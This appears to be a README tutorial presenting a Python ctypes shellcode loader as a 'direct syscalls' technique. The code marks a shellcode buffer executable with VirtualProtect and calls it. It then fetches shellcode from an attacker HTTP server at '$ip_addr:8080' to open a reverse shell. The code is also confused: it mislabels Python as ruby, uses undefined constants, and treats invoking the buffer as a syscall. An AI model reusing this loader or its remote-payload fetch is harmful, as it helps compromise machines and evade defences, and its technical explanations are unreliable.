# Direct SysCalls

Direct syscalls allow us to bypass the Win32 API layer and directly interact with the kernel by performing system calls. Each syscall is identified by a unique number, which can vary across different Windows versions. These numbers can be identified using debuggers or public syscall number lists.

This program demonstrates how to leverage Python and the `ctypes` library to execute direct system calls.

## References

- [System call - Wikipedia](https://en.wikipedia.org/wiki/System_call)
- [Windows Syscall tables by j00ru](https://github.com/j00ru/windows-syscalls)
- [VirtualProtect Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

## Building the Program

In this script, raw shellcode is read from a file and stored in memory with its protection changed using the VirtualProtect function, allowing it to be executable.

The script begins by importing necessary modules from the ctypes library, which provides tools to interact with low-level Windows APIs.

```python
import time
from ctypes import *
from ctypes import wintypes
```

The shellcode is loaded from a file named `shellcode` and stored in a buffer:

```python
with open("shellcode", "rb") as shellcode:
    buf = create_string_buffer(shellcode.read())
```

The `VirtualProtect` function is used to change the protection of the allocated memory region to `PAGE_EXECUTE_READ_WRITE`. This step ensures that the shellcode can execute within the process's memory space:

```ruby
VirtualProtect = windll.kernel32.VirtualProtect

VirtualProtect.argtypes = (
    wintypes.LPVOID,  # Address of the memory region
    SIZE_T,           # Size of the region in bytes
    wintypes.DWORD,   # New protection settings
    wintypes.LPDWORD  # Pointer to store the old protection settings
)

VirtualProtect.restype = wintypes.INT

lpAddress = addressof(buf)              # Address of the shellcode buffer
dwSize = len(buf)                       # Size of the shellcode buffer
flNewProtect = PAGE_EXECUTE_READ_WRITE  # Enable execute and read/write permissions
lpflOldProtect = byref(wintypes.DWORD(0))

VirtualProtect(
    lpAddress,
    dwSize,
    flNewProtect,
    lpflOldProtect
)
```
A syscall prototype and function pointer are defined to execute the shellcode directly. The `syscall_type` defines the expected arguments and return type of the syscall function:

```ruby
syscall_type = CFUNCTYPE(
    NTSTATUS,                # Return type of the syscall
    wintypes.HANDLE,         # Handle to the process
    POINTER(wintypes.LPVOID),# Pointer to the base address
    wintypes.ULONG,          # Zero bits for address alignment
    POINTER(wintypes.ULONG), # Pointer to the region size
    wintypes.ULONG,          # Allocation type flags
    wintypes.ULONG           # Memory protection flags
)

syscall_function = syscall_type(lpAddress)

ProcessHandle = 0xffffffffffffffff  # PseudoHandle representing the current process
BaseAddress = wintypes.LPVOID(0x0) # Starting address for allocation
ZeroBits = wintypes.ULONG(0)       # Alignment bits
RegionSize = wintypes.ULONG(1024 * 15) # Memory size to allocate

# Commit and reserve memory / # Enable execute and read/write permissions
AllocationType = MEM_COMMIT | MEM_RESERVE
Protect = PAGE_EXECUTE_READ_WRITE       

ptr = syscall_function(
    ProcessHandle,
    byref(BaseAddress),
    ZeroBits,
    byref(RegionSize),
    AllocationType,
    Protect
)
```

Finally, if the function call is successful, we print the base address of the allocated memory region and wait for 3 minutes to allow inspection.

```python
if ptr == 0:
    print("Direct Syscall: pointer ->", hex(BaseAddress.value))
    time.sleep(180)
```

## Example Output

The program executes the shellcode loaded from the `shellcode` file, performing the actions encoded within it.

In this example, I used the `requests` module to fetch the shellcode from an HTTP server and open a reverse shell. The rest of the code remains unchanged.

```python
import requests

r = requests.get("http://$ip_addr:8080/shellcode")
buf = create_string_buffer(r.content)
```

![screenshot](https://github.com/user-attachments/assets/82007541-24b0-4863-8224-012747e85f3a)

